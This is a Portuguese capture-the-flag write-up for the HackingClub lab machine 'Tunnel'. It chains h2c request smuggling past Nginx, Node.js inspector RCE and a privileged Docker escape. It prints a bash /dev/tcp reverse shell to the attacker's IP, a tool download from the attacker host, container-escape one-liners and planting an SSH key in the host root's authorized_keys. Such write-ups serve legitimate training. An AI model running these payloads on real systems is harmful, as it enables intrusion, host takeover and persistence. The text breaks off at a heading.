---
title: Tunnel - Desafio Hacker [HackingClub]
description: 'Resolvendo máquina nível médio da Hacking Club sobre h2c request smuggling, RCE e Docker escape'
author: matheus
tags: ["hackingclub", "WriteUps", "RCE", "request smuggling", "docker escape"]
categories: ["SecLab", "Hacking"]
pin: false
comments: true

---

# 📝 Writeup: Tunnel (HackingClub Machine)

### HTTP/2 Cleartext Tunnel (h2c), Nginx Bypass, Node Inspector RCE e Docker Escape

Eu fiz esse desafio em meu ambiente de trabalho com Windows 11 via WSL. Utilizei tanto o terminal do windows - com meu kali sem interface gráfica -, como também aproveitei o WSL2 que me permite executar o Kali Linux com interface gráfica utilizando a tecnologia de virtualização Hyper-V. Em outras palavras, tudo foi realizado dentro de um ambiente já configurado e com ferramentas complementares instaladas. Se faz necessário já ter conhecimento prévio em determinadas coisas como Linux/Bash, Redes - como protocolo HTTP -, Fuzzing, Docker, JAVA e JavaScript para resolver esta máquina.

## 1. Enumeração Inicial e Fuzzing

### 1.1 Scan de portas

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/47dffbac-2eea-4c65-b6b7-f51d8582842b" />

```bash
nmap -sV 172.16.3.113
```
<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/3f824288-3cf3-486d-b3c8-f9a9ce516e10" />

```bash
rustscan -a 172.16.3.113
```

**Resultado da enumeração:**
Identificando duas portas abertas:

- Porta 22 (SSH)
- **Porta 8000 (HTTP)** ← Foco principal da análise

### 1.2 Fuzzing inicial

```bash
ffuf -c -u http://172.16.3.113:8000/FUZZ \
     -w ~/SecLists/Discovery/Web-Content/raft-large-words.txt -t 150
```

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/bcbd33eb-7cc2-4fab-8487-f15b40896f62" />

**Descobertas importantes:**

```text
/error      → Whitelabel Error Page
/actuator   → 403 Forbidden
/actuators   → 403 Forbidden
```

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/c0539110-3f00-4079-82d6-18a82da77a50" />

**Análise técnica:**
A presença de "*Whitelabel Error Page*" e o diretório "*actuator*" indica **Spring Boot Framework**. Esta identificação nos permite usar wordlists específicas para enumerar endpoints do Spring Boot Actuator.

## 2. Enumeração específica para Spring Boot

### 2.1 Wordlist especializada

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/a953fe73-eb8f-4604-88cd-0c11afac6b24" />

```bash
ffuf -c -u http://172.16.3.113:8000/FUZZ \
     -w /home/matheus/SecLists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt -t 150
```

**Resultados obtidos:**

- Diversos endpoints do Spring Boot encontrados (`/actuator/env`, `/actuator/heapdump`, etc.)
- **Todos retornando 403 Forbidden** → Filtrados pelo **Nginx reverse proxy**

**Conclusão da enumeração:**

✅ Backend expõe endpoints sensíveis  
❌ Nginx bloqueia requisições externas

## 3. Indicativo de HTTP/2 Tunnel / h2c

A descrição da máquina menciona **"HTTP/2 tunneling"**, indicando vulnerabilidade de **Request Smuggling** via HTTP/2 Cleartext (h2c).

## 4. HTTP/2 Cleartext Upgrade Bypass - h2c Smuggling

### 4.1 Conceitos fundamentais

**HTTP/2 Cleartext (h2c)** é uma extensão do protocolo HTTP/2 que permite comunicação sem TLS/SSL, utilizando o mecanismo de upgrade HTTP/1.1 definido na **RFC 7540**.

**Request Smuggling** é uma técnica que explora diferenças na interpretação de requisições HTTP entre proxies/load balancers e servidores backend, permitindo bypass de controles de segurança.

### 4.2 Cenário da vulnerabilidade

```text
cliente → nginx (HTTP/1.1 proxy) → backend (Spring Boot + h2c support)
```

### 4.3 Como o bypass funciona tecnicamente

1. **Cliente envia requisição de upgrade:**

   ```http
   GET / HTTP/1.1
   Host: target.com
   Connection: Upgrade, HTTP2-Settings
   Upgrade: h2c
   HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
   ```

2. **Nginx processa e repassa** a requisição porque:
   - Não valida adequadamente headers de upgrade H2C
   - Confia que o backend rejeitará upgrades inválidos  
   - Implementação de proxy não considera implicações de segurança do upgrade

3. **Backend (Spring Boot) responde com upgrade bem-sucedido:**

   ```http
   HTTP/1.1 101 Switching Protocols
   Connection: Upgrade
   Upgrade: h2c
   ```

4. **Nginx estabelece túnel TCP transparente** entre cliente e backend

5. **Tráfego subsequente bypassa completamente as ACLs do Nginx** pois:
   - Comunicação agora é HTTP/2 binário
   - Nginx não consegue mais inspecionar/filtrar requisições
   - Todas as regras de proxy_pass são ignoradas

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/1ab35a7c-a8c2-4924-a00b-7fc576e06535" />

### 4.4 Implicações de segurança do bypass

Isso permite acessar endpoints críticos do **Spring Boot Actuator** que estavam protegidos:

- **`/actuator/env`** - Exposição de variáveis de ambiente (credenciais, flags, configurações)
- **`/actuator/heapdump`** - Dump completo da memória heap da JVM  
- **`/actuator/threaddump`** - Estado atual de todas as threads
- **`/actuator/configprops`** - Propriedades de configuração da aplicação

**Por que o Actuator é crítico:**
O Spring Boot Actuator fornece endpoints de monitoramento e gestão que **nunca deveriam ser expostos publicamente**. São destinados apenas para administração interna e debugging.

**Riscos críticos do /heapdump:**

- Contém **toda a memória ativa** da aplicação Java
- Pode expor **senhas em texto claro**, tokens de sessão, dados de usuários
- Histórico de todas as requisições HTTP processadas  
- Strings de conexão com banco de dados
- Chaves criptográficas em memória

### Entendendo o Spring Boot Actuator

**O que é o Spring Boot Actuator?**
É um módulo que adiciona funcionalidades de produção-ready para aplicações Spring Boot, incluindo métricas, health checks, e informações sobre a aplicação.

**Endpoints críticos comuns:**

- `/actuator/health` - Status de saúde da aplicação
- `/actuator/info` - Informações da aplicação
- `/actuator/metrics` - Métricas de performance
- `/actuator/env` - Variáveis de ambiente
- `/actuator/configprops` - Propriedades de configuração
- `/actuator/beans` - Beans do Spring Context
- `/actuator/mappings` - Mapeamentos de endpoints
- `/actuator/heapdump` - Dump da memória heap
- `/actuator/threaddump` - Dump das threads
- `/actuator/loggers` - Configuração de logs

**Por que é perigoso expor publicamente:**

1. **Vazamento de informações sensíveis**
2. **Credenciais em variáveis de ambiente**
3. **Detalhes da arquitetura interna**
4. **Possível manipulação de configurações**
5. **DoS através de operações custosas**

**Configuração segura:**
```yaml
management:
  endpoints:
    web:
      exposure:
        include: health,info  # Apenas endpoints seguros
  endpoint:
    health:
      show-details: never   # Não mostrar detalhes sensíveis
```

Recomendo a leitura da publicação [Analisando o heapdump do Spring Boot Actuator](https://blog.crowsec.com.br/conhecendo-o-heapdump/) do blog da Crowsec

## 5. Exploração com h2csmuggler

Documentação recomendada: [h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)](https://bishopfox.com/blog/h2c-smuggling-request)

### 5.1 Instalação e configuração

```bash
# Instalação da ferramenta python [github]
# clone do repositório feito para /home/matheus/tools/h2csmuggler 
cd tools #entrando na minha pasta tools dentro da home | se não tiver essa pasta crie com o "mkdir tools"
git clone https://github.com/BishopFox/h2csmuggler
cd h2csmuggler
pip3 install h2
#pip3 install h2 --break-system-packages
#pip3 install -r requirements.txt -> caso tenha o arquivo (nesse caso n precisa ter, apenas fzr com 'h2' direto)
python3 ./h2csmuggler.py -h

# Configurando alias para execução global
nano ~/.bashrc
# Adicionar no final do arquivo:
alias h2csmuggler='python3 ~/tools/h2csmuggler/h2csmuggler.py'
# Aplicando atalho
source ~/.bashrc
```

### 5.2 Testando vulnerabilidade

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/5cab71a2-5ca7-4906-8373-effa398878f3" />

```bash
h2csmuggler -x http://172.16.3.113:8000 --test
```

**Resultado:**

```text
[INFO] Success http://172.16.3.113:8000/ can be used for tunneling
```

### 5.3 Acessando endpoint bloqueado

```bash
h2csmuggler -x http://172.16.3.113:8000 http://backend/actuator
```

**Resultado:**

- Acesso ao conteúdo JSON do Actuator ✅
- **Bypass confirmado** ✅

### 5.4 Explorando variáveis de ambiente

```bash
h2csmuggler -x http://172.16.3.113:8000 http://backend/actuator/env
```

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/dd25fd9f-4122-4d15-9d60-81496f98a51a" />

Se formos ao final do arquivo poderemos identificar o JSON que esperamos do /env

## 6. Informações sensíveis encontradas no /actuator/env

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/aba4d6c3-4061-4527-8219-5b175216c2c8" />

Ao analisar o JSON retornado do `/env` (utilizando um formatter para melhor legibilidade), identificamos

**🚩 A PRIMEIRA FLAG ENCONTRADA:**

```text
hackingclub{c71b3ebb3e25f3c8304d90***************309a3f}
```

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/c05b08ba-cc27-4adc-9fb2-f205fe80af69" />

 - Não se acostume com a flag estando visível na imagem acima, a próxima você terá que botar a mão na massa para achar!

### 6.1 Endpoints importantes descobertos

Juntando o que encontramos anteriormente com esse json podemos identificar/mapear importantes pontos para exploração

<img width="800" height="699" alt="image" src="https://github.com/user-attachments/assets/94b837cd-1b99-446c-bc3b-e3995206f6b8" />

**Endpoints mapeados:**

- `/actuator/env`
- `/actuator/heapdump`  
- `NODE_DEBUG_HOST`
- `NODE_DEBUG_PATH`
- Rotas administrativas internas

**🔍 Endpoint crítico descoberto:**

```text
/admin/internal-web-socket-endpoint
```

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/6d4ff368-01bd-44a9-a930-c6800edf0530" />

### 6.2 WebSocket - Conceito básico

**WebSocket** é um protocolo de comunicação que estabelece uma conexão **bidirecional** e **persistente** entre cliente e servidor sobre uma única conexão TCP. Diferente do HTTP tradicional (request/response), o WebSocket permite que ambas as partes enviem dados a qualquer momento após o handshake inicial (processo de "aperto de mão" onde cliente e servidor negociam e estabelecem a conexão WebSocket).

**Características principais:**

- **Conexão persistente:** Uma vez estabelecida, permanece aberta
- **Baixa latência:** Não há overhead de headers HTTP em cada mensagem  
- **Bidirecional:** Cliente e servidor podem enviar dados simultaneamente
- **Protocolo:** Inicia com HTTP upgrade, depois muda para `ws://` ou `wss://`

**Casos de uso comuns:**

- Chat em tempo real
- Jogos online
- Streaming de dados
- **Debugging remoto** ← Nosso caso específico

### 6.3 Chrome DevTools Protocol (CDP) - Contexto técnico

O endpoint descoberto expõe o **Chrome DevTools Protocol** (CDP), um protocolo de debugging baseado em WebSocket usado por:

- Chrome DevTools
- Node.js Inspector  
- Puppeteer
- Ferramentas de automação de browser

**Como funciona:**

- Comunicação via WebSocket usando mensagens JSON
- Permite controle total sobre o runtime JavaScript
- Acesso a APIs de sistema através do contexto Node.js
- Originalmente projetado para debugging, mas pode ser abusado para RCE

**Domínios críticos do CDP:**

- **Runtime** - Execução de código JavaScript arbitrário
- **Debugger** - Controle de breakpoints e execução
- **Profiler** - Análise de performance  
- **Console** - Interação com console JavaScript

**⚠️ Implicação de segurança:**
CDP **nunca deve ser exposto publicamente** pois permite execução de código arbitrário com os privilégios do processo Node.js.

## 7. Explorando o modo debug do Node.js

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/804f407a-ad91-45d9-a59d-ebfaf4d86ed5" />

### 7.1 Primeiro teste HTTP normal

Utilizando o Postman, com proxy já configurada para testar, vamos selecionar não apenas a opção WebSocket como também HTTP :

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/ab46653e-c951-49eb-af92-f829429a53a3" />

```bash
GET http://172.16.3.113:8000/admin/internal-web-socket-endpoint/
```

**Retorno (mesmo de browser):**

```text
WebSocket request was expected
```

**Análise:**

✅ Endpoint válido  
❌ Requer WebSocket (HTTP não aceito)

### 7.2 Tentando conexão WebSocket

**Testando WebSocket:**

```text
ws://172.16.3.113:8000/admin/internal-web-socket-endpoint/
```

**Resultado:**

```text
Unexpected server response: 400
```

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/d1646138-3ed5-4d08-812d-a6fa3a577c14" />

**Conclusão:** Não é o WebSocket principal, falta descobrir o caminho correto.

## 8. Descobrindo WebSocket real via DevTools API

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://opengraph.githubassets.com/c539d7ae204980d72d2ab4a76bba47985d3c60faa939bf12f27b1a09388d1fff/ChromeDevTools/devtools-protocol" />

### 8.1 Como funciona o Node.js Inspector

O Node.js Inspector expõe uma API HTTP para discovery de sessões de debugging ativas:

**Endpoints padrão do Inspector:**

- `/json` ou `/json/list` - Lista sessões de debugging
- `/json/version` - Versão do protocolo  
- `/json/activate/<id>` - Ativa uma sessão
- `/ws/<id>` - WebSocket endpoint para debugging

### 8.2 Discovery da sessão ativa

Testando endpoint de discovery:

```bash
GET http://172.16.3.113:8000/admin/internal-web-socket-endpoint/json/list
```

**Resultado:**
JSON contendo informações da sessão de debugging:

```json
{
  "id": "7efa5220-45c7-44c2-b367-d9068de778bd",
  "title": "/app/server.js",
  "type": "node",
  "url": "file://app/server.js",  
  "webSocketDebuggerUrl": "ws://172.16.3.113/7efa5220-45c7-44c2-b367-d9068de778bd"
}
```
<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/d47d4b67-07eb-4888-acef-3f69381a0b8a" />

**Análise importante:**
A URL do WebSocket debug usa a URL com ID. Como estamos acessando via `/admin/internal-web-socket-endpoint/` como "raiz" do debug, devemos testar:

```text
ws://172.16.3.113:8000/admin/internal-web-socket-endpoint/7efa5220-45c7-44c2-b367-d9068de778bd
```

**✅ Conexão WebSocket aceita com sucesso no Postman.**

## 9. Obtendo RCE via Chrome DevTools Protocol

### 9.1 Testando estrutura da mensagem CDP

**Primeira tentativa:**

```json
{}
```

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/cd232c50-857d-4829-98e9-13b4f6232048" />

**Erros obtidos:**

- Falta campo obrigatório `id` (integer)
- Falta campo obrigatório `method` (string)

### 9.2 Estrutura correta do Chrome DevTools Protocol

Consultando a [documentação oficial](https://chromedevtools.github.io/devtools-protocol/), a ESTRUTURA correta é:

```json
{
  "id": 1,
  "method": "Domain.methodName",
  "params": {
    "parameterName": "value"
  }
}
```

Detectamos "parâmetros" na estrutura, assim sendo, teremos que identificar não apenas métodos quaisquer, mas algum que tenha como parâmetro alguma função de execução para injetarmos algum código malicioso, então devemos voltar para a documentação oficial, pesquisar e identificá-los.

**Método aparentemente crítico para RCE identificado:**
**`Runtime.evaluate`** indica permitir execução de JavaScript arbitrário.

### 9.3 Descobrindo parâmetros obrigatórios

Consultando [Runtime.evaluate](https://chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-evaluate):

**Sobre o método `Runtime.evaluate`:**

- Permite **executar código JavaScript arbitrário** no contexto do runtime alvo
- Funciona como um "eval()" remoto através do Chrome DevTools Protocol
- Extremamente poderoso: pode acessar APIs do Node.js, sistema de arquivos, rede, etc.
- Originalmente criado para debugging, mas pode ser abusado para **Remote Code Execution (RCE)**

**Parâmetro obrigatório:** `expression` (string)

- Contém o **código JavaScript** que será executado
- Pode ser desde expressões matemáticas simples (`2+4`) até scripts complexos
- No contexto Node.js, permite acesso a módulos como `fs`, `child_process`, etc.

### 9.4 Testando execução de código

**Payload de teste:**

```json
{
  "id": 1,
  "method": "Runtime.evaluate",
  "params": {
    "expression": "7*7;"
  }
}
```

**Resultado:**

```json
{
  "result": {
    "type": "number",
    "value": 49,
    "description": "49"
  }
}
```

✅ **Execução de JavaScript confirmada**  
✅ **RCE já é quase uma realidade, estamos muito próximo dele**

## 10. Payload RCE via child_process - Análise técnica

### 10.1 Como funciona a execução de comandos em Node.js

O Node.js fornece o módulo `child_process` para executar comandos do sistema operacional:

```javascript
const { exec, execSync } = require('child_process');

// Assíncrono
exec('whoami', (error, stdout, stderr) => {
  console.log(stdout);
});

// Síncrono  
const result = execSync('whoami').toString();
```

### 10.2 Construindo payload via DevTools Protocol

**Acessando `require` através do contexto global:**

```javascript
// Usando process.mainModule
process.mainModule.require('child_process')
```

**Resumindo payload:**

Ao chamarmos o processo/módulo principal `process.mainModule` teremos acesso ao módulo `require` e então incluir `child process` - a biblioteca do JS para execução de comando -, para assim chamar o método `exec` e, obviamente, executar o comando que queremos.

```javascript
process.mainModule.require('child_process').exec('COMANDO_DESEJADO')
```

A execução não pode quebrar o JSON e, portanto, precisamos colocar o comando escapando aspas. Vamos aproveitar e atualizar nosso payload com sincronização e string de saída.

**Por que trocar para execSync:**

- Execução síncrona = resposta imediata
- `.toString()` converte Buffer para string  
- Mais fácil de debuggar via CDP

### 10.3 Construção da payload final

**Adaptando payload - Escapando caracteres para JSON:**

```javascript
// Temos: process.mainModule.require('child_process').exec("");
//
// O comando que queremos executar inicialmente para identificação: id
//
// Modernizando
//  * process.require('child_process').exec("id");
// Adaptando
//  * process.require('child_process').execSync(\"id\").toString();
//
// Payload:
// process.require('child_process').execSync(\"id\").toString();
// É necessário mainModule
process.mainModule.require('child_process').execSync(\"id\").toString();
```

→ Trocaremos o .exec para .execSync, pois assim poderemos ver o output na hora, como falamos anteriormente;

→ Podemos adicionar o toString para colocar o output do comando em string;

→ Precisaremos evitar que o JSON não quebre escapando aspas *(\ " \ ")*;

**Payload completa:**

```json
{
  "id": 1,
  "method": "Runtime.evaluate",
  "params": {
    "expression": "process.mainModule.require('child_process').execSync(\"id\").toString();"
  }
}
```

**Resultado:**

```text
uid=0(root) gid=0(root) groups=0(root)
```

🔥 **RCE como root dentro do container Node.js**

Agora basta apenas executarmos via bash nossa shell reversa para acessar a máquina

## 11. Estabelecendo Reverse Shell

### 11.1 Conceito técnico

Reverse shell inverte a direção típica de conexão:

- **Shell normal:** Cliente conecta ao servidor
- **Reverse shell:** Servidor conecta de volta ao cliente

**Vantagens:**

- Bypassa firewalls que bloqueiam conexões de entrada
- Funciona através de NAT/proxy  
- Mais difícil de detectar

### 11.2 Implementação

**Listener na máquina atacante:**

```bash
nc -lvnp 8000
```

**Payload via DevTools Protocol:**

### Entendendo o que vamos fazer

Antes de executar, vale explicar rapidamente os conceitos por trás da técnica:

**Reverse Shell** é quando invertemos a lógica de conexão - ao invés do atacante se conectar na vítima, fazemos a vítima se conectar no atacante. Isso é muito útil porque a maioria dos firewalls bloqueia conexões de entrada, mas não de saída.

**Payload** basicamente é o código malicioso que será executado na máquina alvo.

**O processo funcionará assim, veja:**

1. Deixamos o netcat escutando na nossa máquina (`nc -lvnp 8000`), no aguardo da "comunicação" com o alvo
2. Executamos um comando na vítima que força ela a estabelecer uma conexão com a nossa máquina
3. Quando conectado, temos então um shell completo

**Nossa payload vai usar Node.js** para executar um comando bash que estabelece essa conexão reversa. O `child_process.execSync()` permite executar *comandos do sistema* através do JavaScript.

**O comando bash em si:**

Chamaremos a bash através do caminho completo `/bin/bash` com `-c` para execução de um comando específico.

- `bash -i` abre um shell interativo
- `>& /dev/tcp/IP/PORTA` redireciona a saída para uma conexão TCP
- `0>&1` faz a entrada também usar essa mesma conexão
- Resultado: tudo fica conectado entre as duas máquinas

```bash
/bin/bash -c 'bash -i >& /dev/tcp/10.0.30.175/8000 0>&1'
```

Agora basta executar um reverse shell para ter acesso direto à máquina:

```json
{
  "id": 1,
  "method": "Runtime.evaluate", 
  "params": {
    "expression": "process.mainModule.require('child_process').execSync(\"/bin/bash -c 'bash -i >& /dev/tcp/10.0.30.175/8000 0>&1'\")"
  }
}
```

✅ **Resultado: Shell reversa obtida como root no container**

## 12. Identificando container e melhorando TTY

### 12.1 Análise do ambiente

Explorando o ambiente obtido:

```bash
ls -la
```

**Indicadores de container Docker:**

- Hostname com ID randômico
- Presença do arquivo `/.dockerenv`

**Conclusão:** Estamos como root dentro de um container Docker, não na máquina principal. Necessário Docker Escape para a flag final.

### 12.2 Melhorando interação da shell

A shell reversa inicial é bem limitada - não conseguimos usar setas, clear, ou colar comandos direito. Vamos melhorar isso:

```bash
cd /root
ls -la  
which script  # ✅ Disponível
```

**Sequência de upgrade que funciona:**

```bash
# Primeiro upgrade básico
script /dev/null -c bash

# Configurar terminal
export TERM=xterm
export SHELL=bash

# Background da conexão e fix do terminal
# Ctrl+Z para background
stty raw -echo; fg

# Agora pressione Enter duas vezes
# Reset final (opcional)
reset
```

**Nota:** O comando `fg` pode dar problema nessa máquina especificamente. Se travar, apenas pressione Enter algumas vezes que geralmente volta. Mesmo sem o `fg` funcionar perfeitamente, já conseguimos usar `clear` e colar comandos.

### 12.3 Análise da topologia de rede

```bash
hostname -I  # IP interno do container
```

**Resultado:** `172.18.0.3`

**INTERPRETAÇÃO da rede Docker:**

- Range `172.18.0.0/16` = Rede bridge customizada
- `172.18.0.1` = Gateway do Docker
- `172.18.0.3` = Nosso container atual
- **Host principal:** `172.16.3.113` (mesmo IP que acessamos o site)
- Possíveis outros containers na rede `172.18.0.x`

**Opções realistas de movimento:**

- **Docker escape** - Foco principal, se conseguirmos vai direto para o host
- **Verificar devices montados** - `ls /dev/` para ver se temos acesso privilegiado
- **Enumerar capabilities** - Testar se conseguimos fazer mount, acessar processos do host
- **Network scan** limitado - Container pode não ter ferramentas de rede adequadas

### 12.4 Automatizando Docker security assessment

**deepce.sh** é uma ferramenta especializada em:

- Enumerar capabilities do container  
- Detectar possíveis vetores de escape
- Identificar configurações inseguras
- Testar permissões de arquivo/dispositivo

**Transferindo a ferramenta:**

**Na máquina atacante:**

```bash
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh #ou ir na pasta do seu deepce.sh
python3 -m http.server 8000 #abrir server para transferir o arquivo para o container
```

**No container alvo:**

```bash
wget 10.0.30.175:8000/deepce.sh #colocar seu IP externo de maquina
chmod +x deepce.sh #permissão ao script
./deepce.sh #executar script - vai acabar n sendo realmente necessário utilizar ele para resolvermos esse caso
```

### 12.5 Docker Capabilities e Containers Privilegiados

**Linux Capabilities** são um sistema de controle granular que divide os privilégios de root em unidades menores e específicas:

**Container normal:** Capabilities limitadas (ex: CAP_CHOWN, CAP_DAC_OVERRIDE)  
**Container privilegiado:** Todas as capabilities + acesso a devices do host

**Principais capabilities para escape:**

- **CAP_SYS_ADMIN** - Permite mount de filesystems
- **CAP_SYS_PTRACE** - Debug de processos do host  
- **CAP_SYS_MODULE** - Carregamento de módulos do kernel
- **CAP_DAC_READ_SEARCH** - Bypass de permissões de leitura

**Verificação sem capsh:**
Sem a ferramenta `capsh`, testamos capabilities indiretamente:

- Tentativa de mount → testa CAP_SYS_ADMIN
- Acesso a `/proc/1/` → testa visualização de processos do host  
- Listagem de `/dev/` → verifica acesso a devices

**Análise de partições:**

```bash
disk -l # se disponível (não terá no container)
df -h # estará disponível e mostrará para você as partições que poderão talvez ser montados
lsblk # se disponível
```

A partição de maior tamanho (nvme) será nosso alvo para mount.

## 13. Docker Escape — Explorando Container Privilegiado

### 13.1 Técnica: Host Filesystem Mount

Em containers privilegiados, podemos montar partições do sistema host:

```bash
# Listar partições disponíveis
df -h

# Tentar montar a partição principal do host  
mount /dev/nvme0n1p1 /mnt
```

**Por que isso funciona:**

- Container privilegiado tem **CAP_SYS_ADMIN**
- Acesso direto aos **device nodes** do host (`/dev/nvme0n1p1`)  
- Capability permite **mount de filesystems arbitrários**

**Resultado:**

✅ Mount bem-sucedido → Container é privilegiado  
✅ `/mnt` agora contém o **filesystem completo do host**  
✅ `/mnt/root` = diretório `/root` do sistema hospedeiro

**PRONTO!!** Agora é só dar "`cat root.txt`" e ver a última flag que precisamos, mas ainda não estamos satisfeito. Faremos isso de outra forma, vamos estipular desafios. Só poderemos visualizar tal arquivo se estivermos conectados como root da máquina host principal e não apenas acessando a partição dessa máquina montada. Para isso, nós iremos nos conectar diretamente via conexão SSH.

### 13.2 Outras técnicas de escape (se mount falhasse)

Se por acaso o mount não funcionasse, existem outras maneiras de escapar de containers privilegiados:

**nsenter com PID namespace compartilhado:**
Se o container tiver acesso aos processos do host (`--pid=host`), podemos usar `nsenter` para "entrar" no namespace do processo init do host:
```bash
nsenter -t 1 -m -p /bin/bash
```

**Socket do Docker exposto:**
Alguns containers têm acesso ao socket do Docker montado. Isso permite criar novos containers com acesso total ao host:
```bash
docker -H unix://var/run/docker.sock run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i bash
```

**Escrita em devices de bloco:**
Com acesso aos device nodes (`/dev/sda`, `/dev/nvme0n1`), podemos escrever diretamente no disco:
```bash
# Muito perigoso - pode corromper o sistema
echo 'dados' > /dev/sda1  
```

**Carregamento de módulos do kernel:**
Com `CAP_SYS_MODULE`, podemos carregar módulos maliciosos no kernel do host.

Mas o mount é geralmente a técnica mais direta e confiável quando o container é privilegiado.

### 13.3 Acesso ao host via SSH (método alternativo)

Já conseguimos ver o conteúdo do host através do mount, mas vamos fazer algo mais elegante. Ao invés de só olhar os arquivos pela partição montada, que tal conseguir um shell SSH direto na máquina host? 

A ideia é simples: como temos acesso de escrita ao diretório `/root/.ssh/` do host (através do `/mnt/root/.ssh/`), podemos adicionar nossa chave pública SSH no arquivo `authorized_keys`. Depois disso, conseguimos conectar via SSH como se fôssemos um usuário legítimo.

**Entendendo SSH e autenticação por chaves:**

SSH (Secure Shell) é um protocolo de comunicação segura que permite conexão remota entre computadores. Existem duas formas principais de autenticação:

- **Password:** Usuário e senha (menos seguro)
- **Chave pública/privada:** Par de chaves criptográficas (mais seguro)

A autenticação por chaves funciona assim: você gera um par de chaves - uma privada (que fica secreta com você) e uma pública (que pode ser compartilhada). A chave pública é adicionada no arquivo `~/.ssh/authorized_keys` do servidor, e quando você se conecta com sua chave privada, o SSH confirma que você possui a chave correspondente.

#### Dentro da máquina pessoal:

Primeiro, vamos gerar um par de chaves SSH na nossa máquina:

**Gerando chave SSH:**

```bash
# dentro do meu diretório organizado
ssh-keygen -t rsa -f rsa
cat rsa.pub | base64 -w0 | xclip -sel clip
```

**Explicando os comandos:**

- `ssh-keygen -t rsa -f rsa`: Gera um par de chaves RSA. O `-t rsa` especifica o tipo de criptografia, e `-f rsa` define o nome dos arquivos (rsa e rsa.pub)
- `cat rsa.pub`: Mostra o conteúdo da chave pública (arquivo .pub)
- `base64 -w0`: Codifica em base64 sem quebras de linha (-w0). Isso facilita a transferência, pois evita problemas com caracteres especiais
- `xclip -sel clip`: Copia o resultado para a área de transferência do sistema (clipboard). Assim podemos colar facilmente

O resultado será algo como uma string longa em base64 que contém nossa chave pública codificada.

#### Dentro da máquina alvo:

Agora, do container comprometido, vamos adicionar nossa chave pública ao arquivo `authorized_keys` do root no host. Como temos o filesystem montado em `/mnt`, podemos escrever diretamente:

**Copiando chave para authorized_keys do host:**

```bash
#echo '<base64_da_chave_publica_shift_ctrl_c>' | base64 -d >> /mnt/root/.ssh/authorized_keys
echo 'c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FENURmbGVNTStESmNiTUxUSFZRd3lQT2lrYmI0QjV4eUFNb1JPZmdUKzIwWWtJSmxpcE91M25jTTB1N2tJb2ZZTE1NUTY2ZzIycFVkZHNxWXNXclZyUnNGSjZEVEFVT0lubVlESHdjMlVZM0ZzWWdFUjBsV0RaTlJ5b2lTS3hNS2hLTW42VWxWc21GVGx2MDBDNGFrQml1MnlvQytVb2hWaDlYTDdsNFd2eE5EWk05TDF3b0wxdWtRZGUyMDUxd2lWakVKc1kvNXFoUGJzUUM1V2o5YmttNmdYcS96YVExdEQzVW9HbVZtMjhnN1dNMk1BNFVaWGVxOGw4Qnh2YVV5bFZDdU9nZW9NNW5lUlFFUUxiOERGWVdDZmVBYWF0SFBPaDdmTGZnQThkRUxHbS82VUFKSGtjSmJrdzdkMUdHeFRlQlZ1UENvM3FGVzFNbDVvVW1UZUVUNUduaVkwUzJQazlSYjZmblEyQnBUQXpOYmg0R2JFNVN2Ykt4Wjl5ZFFNdnlETUpicDNjYldLekhVdFFLQ0RTNEFJZGI0TW95ZUpzeUE3T1UwL2xkV2M3OCt2UFVoK1daZlIyRnFSSUtMbmdHRUtocDFueHRQRVVmeFpzY3BLSlNGRWEyTE5ZZENCbGtxcHowZDh5ejFvazBEeTdMOFhlUmtHbXhXOHlMQ2M9IG1hdGhldXNAbGFpZGxlcgo=' | base64 -d > authorized_keys
```

**Explicando o processo de injeção:**

- `echo 'string_base64'`: Enviamos a string em base64 que copiamos anteriormente
- `base64 -d`: Decodifica a string base64 de volta para o formato original da chave SSH
- `> authorized_keys`: Redireciona a saída para o arquivo authorized_keys (sobrescrevendo o conteúdo)
- O comando comentado mostra o caminho completo: `/mnt/root/.ssh/authorized_keys`, pode ser util caso faça fora da pasta .ssh

**Por que usar base64?**

Usar base64 tem vantagens práticas importantes:

- **Evita problemas de encoding:** Chaves SSH contêm caracteres especiais que podem ser interpretados incorretamente pelo terminal
- **Facilita copiar/colar:** Uma string base64 é uma linha contínua, sem quebras que podem causar erros
- **Transferência segura:** Não há risco de caracteres serem modificados durante a cópia entre máquinas
- **Compatibilidade universal:** Base64 funciona em qualquer terminal, independente da configuração

**Diferença entre `>` e `>>`:**

- `> authorized_keys`: **Sobrescreve** o arquivo, ou seja, apaga o conteúdo anterior (não teve caminho por já estar no diretório).
- `>> /mnt/root/.ssh/authorized_keys`: **Adiciona** ao final do arquivo, ou seja, preserva chaves existentes (exemplo fora da pasta).

No comando comentado usamos `>>` porque é mais seguro - preserva outras chaves SSH que possam existir no sistema. Isso evita quebrar o acesso de administradores legítimos que já tinham chaves configuradas. No nosso caso específico, como estávamos criando o arquivo do zero (primeira vez), tanto `>` quanto `>>` dariam o mesmo resultado.

**Como a persistência funciona:**

